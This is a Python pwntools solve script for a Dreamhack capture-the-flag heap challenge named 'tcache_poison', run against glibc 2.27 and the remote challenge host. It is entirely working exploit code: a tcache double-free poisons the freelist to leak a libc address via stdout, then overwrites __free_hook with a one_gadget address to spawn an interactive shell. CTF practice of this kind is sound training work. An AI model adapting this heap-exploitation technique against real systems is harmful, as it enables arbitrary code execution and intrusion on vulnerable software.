#!/usr/bin/env python3

from pwn import *

exe = ELF("./tcache_poison_patched", checksec=False)
libc = ELF("./libc-2.27.so", checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)

context.binary = exe

if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("host3.dreamhack.games", 19580)

def allocate(size, content):
    p.sendlineafter(b'\n', str(1))
    p.sendlineafter(b'Size: ', str(size))
    p.sendafter(b'Content: ', content)

def free():
    p.sendlineafter(b'\n', str(2))

def print_content():
    p.sendlineafter(b'\n', str(3))

def edit(content):
    p.sendlineafter(b'\n', str(4))
    p.sendafter(b'chunk: ', content)

input()

# Leak libc by Double-Free
allocate(0x30, b'a'*8)
free()
edit(b'\0'*0x10)
# 0 <- 0
free()

# 0 -> exe.sym['stdout']
allocate(0x30, p64(exe.sym['stdout']))
# exe.sym['stdout']
allocate(0x30, b'a'*8)
allocate(0x30, b'\x60')

print_content()
p.recvuntil(b'Content: ')
libc_leak = u64(p.recv(6) + b'\0'*2)
print("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x3ec760
print("Libc base: " + hex(libc.address))

# One_gadget
one_gadget = [0x4f3ce, 0x4f3d5, 0x4f432, 0x10a41c]
allocate(0x40, b'a'*8)
free()
edit(b'\0'*0x10)
free()

allocate(0x40, p64(libc.sym['__free_hook']))
allocate(0x40, b'a'*8)
allocate(0x40, p64(one_gadget[2] + libc.address))

free()

p.interactive()